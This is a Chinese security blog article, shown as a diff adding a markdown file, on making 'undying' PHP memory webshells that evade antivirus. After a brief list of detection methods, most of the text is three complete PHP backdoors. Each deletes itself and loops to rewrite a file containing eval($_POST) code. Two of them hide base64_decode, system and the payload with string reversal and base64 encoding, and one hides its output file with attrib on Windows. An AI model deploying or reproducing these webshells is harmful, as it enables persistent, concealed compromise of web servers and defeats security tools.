@@ -1,0 +1,280 @@
+## **webshell的检测方式**
+
+之前看过一篇文章，专门讲免杀的，里面提了目前为止，各类杀软的检测技术，大致有以下几种：
+
+基于流量和字符特征的检测  
+基于文件特征  
+基于AST语义分析  
+动/静态符号执行  
+机器学习  
+终极检测引擎Rasp
+
+> 具体可以参考文章[Webshell免杀的一些思考 ](../articles/web/253710.html "Webshell免杀的一些思考")
+
+## webshell内存马制作
+
+### 内存马的概念
+
+在讲内存马之前，首先讲一下webshell的分类：
+
+  * 大马
+
+  1. 体积大，功能全。
+  2. 能够调用系统的关键函数。
+  3. 以代码加密进行隐藏
+
+  * 小马
+
+  1. 体积小，功能少
+  2. 只有一个上传功能
+
+  * 一句话
+
+  1. 代码短，只有几行代码
+  2. 使用场景大，可单独生成其他文件、插入文件
+  3. 安全性高，隐蔽性强，可变形免杀
+
+php内存马，就是常讲的不死马，这里根据其原理进行分析，并制作免杀。
+
+###  **制作一个php内存马**
+
+目前调用了几个php内置函数，来生成一个内存吗
+
+    
+    
+    <?php
+      set_time_limit(0);
+      ignore_user_abort(1);
+      unlink(__FILE__);
+      while (1) {
+      	$content = '<?php @eval($_POST["zzz"]) ?>';
+      	file_put_contents("config.php", $content);
+      	usleep(10000);
+      }
+    ?>
+
+这是一个最常见的内存吗，其中，他调用了几个函数：
+
+set_time_limit(time)：用来设置脚本最大的执行时间，如果为0的话，就会一直执行这个脚本，设置其他数字的话，则按照设置的秒数来进行执行，注意，执行时间和php.ini里的max_execution_time设置有很大的关系，真实时间的计算公式是max_execution_time+time
+
+ignore_user_abort(1)：当链接断开，继续执行
+
+unlink(__FILE__)：删除当前文件
+
+file_put_contents()：创建文件，写入内容
+
+usleep()：延迟执行
+
+在这个代码片段中，起关键作用的是 while()，当php脚本执行后，代码写入内存。
+
+然后不停的创建更新config.php文件。
+
+这个过程讲持续到进程重启。
+
+目前这种内存马大多杀软都能够进行查杀了。
+
+###  **制作一个免杀的php内存马**
+
+    
+    
+    <?php
+    header("Content-Type: text/html; charset=utf-8");
+    static $time =10000 ;       
+    $uar = 'Cjw/cGhwIGV';  
+    $dap = '2YWwoJF9QT1NUW2NdKTs/Pg=='
+    static $yourcode = $uar.$dap;   //bypass
+    //system information：windows+apache2.2+php5.2+mysql
+    function EasyTo($myfile,$author){
+        fwrite($myfile,$author);
+        return Fread($myfile,"111");  
+    }
+    class FileRead{
+        function __construct($read,$num){
+            $a = 1;
+            if ($num != Null)
+                 $a = strlen($num);
+            print Fread($read,$a);
+        }
+        function test(){
+            echo "<br>"."ok\n";
+        }
+    	function eb($yijufa){  
+            $b = "_46esab";
+    		$e = "edocne";
+    		$eb = srv($e.$b);
+            return $eb($yijufa);
+    		
+        }
+    	function db($jiekai){  
+            $c = "_46esab";
+    		$a = "edoced";
+    		$db = srv($a.$c);
+            return $db($jiekai);
+        }
+    }
+    function srv($str){   
+        $new_str = "";
+    	for ($i = strlen($str)-1;$i >= 0; $i--){
+            $new_str .= $str{$i};
+        }
+        return $new_str;
+    }
+    ignore_user_abort(true);
+    set_time_limit($time);  
+    
+    while(1)
+    {
+    	$clear = fopen("log.php", "r");  
+    	fgets($clear);  
+    	echo $tmp = "\n".fgets($clear);  
+    
+        $myfile = fopen("log.php ", "a+");   
+        $a = $myfile;
+    	$b = new FileRead($a,"asdasdasdasdasdasd");
+    
+    	
+      $t = date('Y-M-D H:i:s',time()); 
+    	$tt = $b->eb($t);  
+    	unlink(__FILE__);
+    
+    	$code = $yourcode;  
+    
+    	if(md5($tmp)===md5($b->db($code)))       
+    	{
+    		echo md5($tmp)."\n";
+    		echo md5($b->db($code));	
+    	}
+        else
+    	    EasyTo($a,$b->db($tt.$code));   
+    	fclose($clear);
+    	fclose($myfile);
+        usleep(5000000);
+        
+    }
+    //fclose($a);
+    ?>
+
+这个免杀内存马，运行后将持续创建log.php
+
+我采用了拼接，旋转，加密解密的手法进行隐藏。
+
+并且自定义函数，配合变量替换，成功对绕过进行免杀
+
+由于异或的方法已经被杀烂了，这里就没有采用异或
+
+因为创建了类，所以这个内存马，暂时只支持5.3以上的高级php版本
+
+默认是5秒生成一次
+
+缺点是移植性查，因为生成的内存马代码是固定的
+
+###  **可移植的免杀php内存马**
+
+上面我写的内存马，由于生成的文件固定、文件内容有危险函数，即使能够被杀软干掉，然后再生成，但是由于不能够修改生成的文件内容，所以针对移植性做了改进
+
+    
+    
+    <?php
+    static $time =10000 ;     
+    static $yourcode = 'Cjw/cGhwIGV2YWwoJF9QT1NUW2NdKTs/Pg==';      //bypass
+    header("Content-Type: text/html; charset=utf-8");
+    function EasyTo($myfile,$author){
+        fwrite($myfile,$author);
+        return Fread($myfile,"111"); 
+    }
+    class FileRead{
+        function __construct($read,$num){
+            $a = 1;
+            if ($num != Null)
+                 $a = strlen($num);
+            print Fread($read,$a);
+        }
+        function test(){
+            echo "<br>"."ok\n";
+        }
+    	function eb($yijufa){  
+            $b = "_46esab";
+    		$e = "edocne";
+    		$eb = srv($e.$b);
+            return $eb($yijufa);
+    		
+        }
+        function db($jiekai){  
+            $c = "_46esab";
+    		$a = "edoced";
+    		$db = srv($a.$c);
+            return $db($jiekai);
+        }
+        function zhixing($hiddden){  
+            $ss = "ss";
+            $tt = "tt";
+            $yy = "yy";
+            $ee = "em";
+            $db = srv($ss[1].$yy[1].$ss[0]).srv($ee[1].$ee[0].$tt[0]);
+            return $db($hiddden);
+        }
+    	
+    	
+    	
+    
+    }
+    function srv($str){    
+        $new_str = "";
+    	for ($i = strlen($str)-1;$i >= 0; $i--){
+            $new_str .= $str{$i};
+        }
+        return $new_str;
+    }
+    
+    ignore_user_abort(true);
+    set_time_limit($time);  
+    
+    
+    
+    
+    while(1)
+    {
+    	$clear = fopen("log.php", "r"); 
+    	fgets($clear);
+    	echo $tmp = "\n".fgets($clear);  
+    
+        $myfile = fopen("log.php ", "a+"); 
+        $a = $myfile;
+    	$b = new FileRead($a,"asdasdasdasdasdasd");
+    
+    	
+        $t = date('Y-M-D H:i:s',time()); 
+    	$tt = $b->eb($t);  
+    	unlink(__FILE__);
+    
+    
+    	$code = $yourcode; 
+    
+    	if(md5($tmp)===md5($b->db($code)))     
+    	{
+    	    
+    		echo md5($tmp)."\n";
+    		echo md5($b->db($code));	
+    	}
+        else
+    	    EasyTo($a,$b->db($tt.$code));  
+    
+    
+        echo $b->zhixing(srv("birtta")." +s +h log.php");
+    	fclose($clear);
+    	fclose($myfile);
+        usleep(5000000);
+        
+    }
+    ?>
+
+在最新的这个内存马里面，我是用了$yourcode让用户自定义一句话
+
+然后隐藏生成的log.php文件，这样即使生成了这个文件，windows下也是隐藏的
+
+生成过程如图：
+
+![1638345971_61a72cf3cc7d506e6bccf.png!small?1638345971958](https://image.3001.net/images/20211201/1638345971_61a72cf3cc7d506e6bccf.png!small?1638345971958)
+
+  
+
